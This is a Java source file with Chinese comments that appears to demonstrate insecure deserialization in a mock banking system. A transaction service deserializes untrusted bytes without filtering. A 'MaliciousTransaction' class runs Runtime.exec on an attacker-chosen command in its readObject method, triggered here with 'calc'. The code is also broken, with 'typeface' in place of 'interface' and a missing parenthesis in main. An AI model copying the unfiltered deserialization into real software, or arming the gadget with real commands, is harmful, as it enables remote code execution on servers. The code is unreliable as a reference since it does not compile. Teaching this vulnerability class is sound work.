import java.io.*;
import java.util.*;

// 高抽象建模的交易系统接口
typeface TransactionProcessor {
    void processTransaction(byte[] transactionData) throws Exception;
}

// 核心交易抽象类
abstract class AbstractTransaction implements Serializable {
    protected String accountId;
    protected double amount;
    
    public AbstractTransaction(String accountId, double amount) {
        this.accountId = accountId;
        this.amount = amount;
    }
    
    public abstract void execute();
}

// 合法转账交易
class TransferTransaction extends AbstractTransaction {
    private String targetAccount;
    
    public TransferTransaction(String accountId, double amount, String targetAccount) {
        super(accountId, amount);
        this.targetAccount = targetAccount;
    }
    
    @Override
    public void execute() {
        System.out.println("[合法交易] 从账户 " + accountId + " 转账 $" + amount + " 至 " + targetAccount);
    }
}

// 恶意交易负载（模拟攻击者构造的恶意类）
class MaliciousTransaction extends AbstractTransaction {
    private String command;
    
    public MaliciousTransaction(String command) {
        super("attacker", 0);
        this.command = command;
    }
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 模拟恶意代码执行
        Runtime.getRuntime().exec(command);
    }
    
    @Override
    public void execute() {}
}

// 交易处理服务
class TransactionService implements TransactionProcessor {
    @Override
    public void processTransaction(byte[] transactionData) throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(transactionData))) {
            Object obj = ois.readObject();
            if (obj instanceof AbstractTransaction) {
                ((AbstractTransaction)obj).execute();
            }
        }
    }
}

// 模拟银行系统的主类
public class BankingSystem {
    public static void main(String[] args) throws Exception {
        TransactionProcessor processor = new TransactionService();
        
        // 模拟正常交易流程
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(new TransferTransaction("ACC123", 1000, "ACC456"));
        }
        
        System.out.println("=== 正常交易处理 ===");
        processor.processTransaction(bos.toByteArray());
        
        // 模拟攻击者注入恶意序列化数据
        System.out.println("=== 恶意攻击演示 ===");
        ByteArrayOutputStream attackStream = new ByteArrayOutputStream();
        try (ObjectOutputStream aos = new ObjectOutputStream(attackStream)) {
            aos.writeObject(new MaliciousTransaction("calc"); // Windows系统执行计算器
        }
        
        // 触发漏洞
        processor.processTransaction(attackStream.toByteArray());
    }
}